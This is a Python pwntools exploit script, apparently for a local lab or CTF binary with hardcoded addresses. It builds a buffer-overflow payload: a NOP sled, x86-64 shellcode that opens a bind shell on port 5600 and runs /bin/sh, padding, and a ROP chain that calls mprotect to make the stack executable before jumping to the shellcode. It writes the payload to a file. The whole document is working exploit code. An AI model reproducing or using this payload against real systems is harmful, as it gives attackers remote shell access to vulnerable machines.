from pwn import *

libc_base = 0x00007ffff7c00000

nop_sled = b'\x90' * 30

shellcode = b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
shellcode += b"\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
shellcode += b"\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02"
shellcode += b"\x15\xe0" # port 5600
shellcode += b"\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05"
shellcode += b"\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31"
shellcode += b"\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59"
shellcode += b"\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48"
shellcode += b"\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a"
shellcode += b"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54"
shellcode += b"\x5f\x6a\x3b\x58\x0f\x05";

padding = b"A" * (208 - len(nop_sled) - len(shellcode))
padding += b"B"*8

dummy = p64(0x0041414141414141)
m_protect = p64(0x7ffff7feb120)

addr_rwx = p64(0x00007ffffffde000)   #here getting wrong

shellcode_addr = p64(0x7fffffffdc48)

ret = p64(0x4011bd)

#gadgets

pop_rdi = p64(libc_base + 0x28715)
pop_rsi = p64(libc_base + 0x2a671)
pop_rdx = p64(libc_base + 0x93359)

exploit = nop_sled + shellcode + padding
exploit += pop_rdi
exploit += addr_rwx
exploit += pop_rsi
exploit += p64(0x1000)
exploit += pop_rdx  
exploit += p64(0x7)
exploit += dummy
# exploit += ret
exploit += m_protect
exploit += shellcode_addr

file = open('exp', 'wb')
file.write(exploit)
file.close()
